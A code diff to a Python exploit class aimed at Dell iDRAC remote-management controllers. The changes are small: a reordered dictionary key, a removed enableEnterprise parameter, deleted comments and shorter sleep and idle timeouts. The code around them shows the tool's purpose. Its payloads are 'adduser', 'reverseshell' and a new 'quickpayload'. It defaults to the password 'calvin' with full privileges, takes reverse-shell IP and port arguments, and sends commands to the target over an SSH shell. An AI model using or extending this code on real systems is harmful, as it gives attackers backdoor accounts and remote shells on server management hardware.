@@ -67,10 +67,10 @@ class iDRAC:
             "ip": self.ip,
             "port": self.port,
             "hostname": None,
+            "systemModel": None,
             "idracModel": None,
             "license": None,
             "fwVersion": None,
-            "systemModel": None,
             "error": None,
             "success": True
         }
@@ -181,13 +181,12 @@ class iDRAC:
                      password: str = "calvin", 
                      privilege: str = "0x000001ff",
                      reverse_ip: str = None,
-                     reverse_port: int = None,
-                     enableEnterprise: bool = False):
+                     reverse_port: int = None):
         """
         Execute exploit with selected payload
         
         Args:
-            payload_type: Type of payload to use ("adduser" or "reverseshell")
+            payload_type: Type of payload to use ("adduser", "reverseshell" or "quickpayload")
             username: Username for adduser payload
             password: Password for adduser payload
             privilege: Privilege level for adduser payload
@@ -359,7 +358,6 @@ class iDRAC:
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             
-            # Connect with default iDRAC credentials
             print(f"SSH connecting to {self.ip}...")
             client.connect(
                 hostname=self.ip,
@@ -373,7 +371,7 @@ class iDRAC:
             
             # Get shell channel
             shell = client.invoke_shell()
-            time.sleep(3)  # Wait for shell to be ready
+            time.sleep(3)
             
             # Clear any initial output
             while shell.recv_ready():
@@ -384,12 +382,12 @@ class iDRAC:
             for cmd in commands:
                 print(f"Executing: {cmd}")
                 shell.send(f"{cmd}\n")
-                time.sleep(1)  # Brief pause between commands
+                time.sleep(0.25)
             
             # Wait for all commands to finish
             print("Waiting for commands to complete...")
             last_data_time = time.time()
-            idle_timeout = 15  # seconds
+            idle_timeout = 10 # seconds
             
             while True:
                 if shell.recv_ready():
